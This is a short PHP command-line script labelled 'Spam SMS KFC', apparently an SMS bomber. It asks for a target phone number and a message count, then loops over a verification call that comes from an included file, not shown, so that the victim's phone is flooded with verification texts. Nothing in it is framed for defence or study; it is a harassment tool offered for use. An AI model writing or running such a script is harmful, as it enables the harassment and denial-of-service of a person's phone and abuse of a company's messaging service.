<?php
include 'bomkfc.php';

/*
    https://github.com/zerosvn/bom-sms/
    Modified By ZeroSvn
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "
+------------------------------------+
+                                    +
+    ...::[$ Spam SMS KFC $]::...    +
+        [# Code By ZeroSvn ]        +
+                                    +
+------------------------------------+\n\n";
echo "Nomor Target\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan\nInput : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) { 
    $init->Verif($init->no);
}

